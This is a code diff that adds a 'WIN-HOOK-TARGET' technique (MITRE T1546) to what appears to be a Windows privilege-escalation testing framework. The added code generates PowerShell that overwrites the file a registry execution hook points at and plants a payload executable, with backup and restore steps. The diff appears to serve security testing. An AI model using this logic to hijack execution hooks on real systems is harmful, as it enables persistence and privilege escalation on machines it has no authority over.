@@ -342,6 +342,24 @@ def _ev_default(p, k):
     return p.get(k) or ""
 
 
+def _win_hook_target(f):
+    s = f.get("subject", "")
+    if " -> " not in s:
+        return None
+    hook, path = s.split(" -> ", 1)
+    return {"path": path, "hook": hook}
+
+
+def _b_win_hook_target(p):
+    return f"""  # overwrite the file a registry execution hook points at; it runs when the hook next fires
+  $t = {ps(p['path'])}
+  if (-not (Pf-Backup $t)) {{ Pf-Skip 'could not back up the hook target'; return }}
+  if ($t -match '\\.dll$') {{ Pf-WriteMarkerFile $t 'benign placeholder (not a real library)' }} else {{ Pf-WritePayloadExe $t }}
+  Pf-Note "overwrote the target of {ps(p['hook'])}: $t"
+  Pf-Record planted "hook target replaced; it executes when the hooked process or logon next fires"
+  Pf-RestoreNow $t"""
+
+
 WINDOWS: List[Technique] = [
     Technique("WIN-SERVICE-BIN", "T1574.010", "Overwrite a writable service binary", {"PS-SVC-001"}, _win_service_bin, _b_win_service_bin),
     Technique("WIN-UNQUOTED", "T1574.009", "Unquoted service path hijack", {"PS-SVC-003"}, _win_unquoted, _b_win_unquoted),
@@ -349,6 +367,9 @@ WINDOWS: List[Technique] = [
     Technique("WIN-TASK-BIN", "T1053.005", "Overwrite a privileged task's program", {"PS-TASK-001"}, _win_task, _b_win_task),
     Technique("WIN-AUTORUN", "T1547.001", "Overwrite a machine-wide logon program", {"PS-AUTO-001"}, _win_autorun, _b_win_autorun),
     Technique("WIN-AIE-MSI", "T1548.002", "AlwaysInstallElevated MSI", {"PS-POL-001"}, _win_aie, _b_win_aie),
+    Technique("WIN-HOOK-TARGET", "T1546", "Overwrite a registry execution-hook target",
+              {"PS-HOOK-001", "PS-HOOK-002", "PS-HOOK-003", "PS-HOOK-004", "PS-HOOK-005", "PS-HOOK-006"},
+              _win_hook_target, _b_win_hook_target),
 ]
 
 
